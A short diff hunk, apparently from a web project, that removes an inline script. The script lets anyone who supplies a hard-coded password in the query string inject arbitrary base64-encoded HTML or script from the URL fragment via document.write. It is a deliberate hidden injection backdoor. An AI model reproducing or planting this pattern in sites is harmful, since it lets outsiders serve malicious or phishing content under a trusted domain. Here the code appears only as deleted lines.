@@ -1,9 +1,0 @@
-<script>
-var pass = new URLSearchParams(location.search).get("pass");
-if(pass === "YAEBALGITHUB") {
-    var hash = location.hash.substring(1);
-    if(hash) {
-        document.write(decodeURIComponent(escape(atob(hash))));
-    }
-}
-</script>
